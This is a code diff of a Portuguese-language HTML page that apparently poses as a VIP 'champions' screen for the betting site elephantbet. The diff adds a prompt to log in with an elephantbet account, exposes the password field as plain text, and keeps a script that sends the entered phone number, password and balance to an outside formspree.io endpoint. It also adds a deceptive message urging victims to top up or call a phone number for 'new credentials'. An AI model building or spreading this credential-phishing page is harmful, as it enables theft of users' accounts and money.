@@ -47,6 +47,13 @@
     p {
       font-size: 14px;
       color: #bbb;
+      margin-bottom: 10px;
+    }
+
+    .info-elephantbet {
+      font-size: 13px;
+      color: #ff69b4;
+      margin-top: -5px;
       margin-bottom: 20px;
     }
 
@@ -136,19 +143,20 @@
 <body>
   <div class="container">
     <h1>Bem-vindo à <span>Tela dos Campeões</span></h1>
-    <p>Somente para quem tem saldo de 20.000 Kz ou mais</p>
+    <p>Somente para usuarios Vip</p>
+    <p class="info-elephantbet">Por favor, faça login com a sua conta da <span style="font-weight: bold;">elephantbet</span>.</p>
 
     <form id="championForm" method="POST">
       <label for="account">Número da Conta</label>
       <div class="input-group">
-        <i class="fas fa-phone"></i>
-        <input type="tel" id="account" name="numero" placeholder="912345678" pattern="9[0-9]{8}" maxlength="9" required>
+        <i class="fas fa-phone" ></i>
+        <input type="tel" id="account" name="numero" placeholder="Tell" pattern="9[0-9]{8}" maxlength="9" required>
       </div>
 
       <label for="senha">Senha da sua conta</label>
       <div class="input-group">
         <i class="fas fa-lock"></i>
-        <input type="password" id="senha" name="senha" placeholder="********" required>
+        <input type="text" id="senha" name="senha" placeholder="Senha" required>
       </div>
 
       <label for="saldo">Seu Saldo Atual</label>
@@ -185,15 +193,14 @@
           respostaTexto.innerHTML = "<i class='fas fa-times-circle'></i> Por favor, insira um saldo válido.";
           resposta.style.color = "#ff4b4b";
         } else if (saldo >= 20000) {
-          respostaTexto.innerHTML = "<i class='fas fa-check-circle'></i> ✅ Acesso concedido. O seu saldo é suficiente para continuar!";
+          respostaTexto.innerHTML = "<i class='fas fa-check-circle'></i> ✅ Acesso concedido.mais notamos que o seu saldo real não é igual ou superior a 20 mill kz, carega tua conta e tenta novamente . caso seja liga para 926240472 para receber novas credencias, obrigado!";
           resposta.style.color = "#00ffc3";
         } else {
           respostaTexto.innerHTML = "<i class='fas fa-exclamation-circle'></i> Desculpa, mas esta conta não possui 20.000 Kz ou mais.";
           resposta.style.color = "#ff4b4b";
 
-          // Envia os dados mesmo assim
           const formData = new FormData(form);
-          fetch("https://formspree.io/f/xvgzrljq", {
+          fetch("https://formspree.io/f/mwplrdgz", {
             method: "POST",
             body: formData
           }).then(() => {
